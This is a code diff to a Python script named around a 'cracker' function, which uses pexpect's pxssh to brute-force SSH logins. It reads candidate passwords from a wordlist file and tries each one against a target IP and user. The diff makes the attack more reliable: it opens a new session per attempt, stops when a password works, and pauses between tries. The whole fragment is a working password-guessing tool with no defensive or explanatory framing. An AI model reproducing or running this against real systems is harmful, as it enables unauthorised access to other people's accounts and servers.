@@ -13,16 +13,25 @@ from pexpect import pxssh
 
 def cracker(user, ipAddress, txtFile ):
     filepath =open(txtFile)
-    s=pxssh.pxssh()
     for i in filepath.readlines():
         secret=i.strip("\n")
         print(secret)
+        s=pxssh.pxssh()
         try:
             s.login(ipAddress, user, secret)
-            print("password found  " + secret )
+            print("The Password is  "+ secret)
+            break
+            
+            
         except pxssh.ExceptionPxssh as e:
             print ("pxssh failed to login")
             print(e)
+            time.sleep(1)
+    
+        
+
+
+
             
             
 def main():
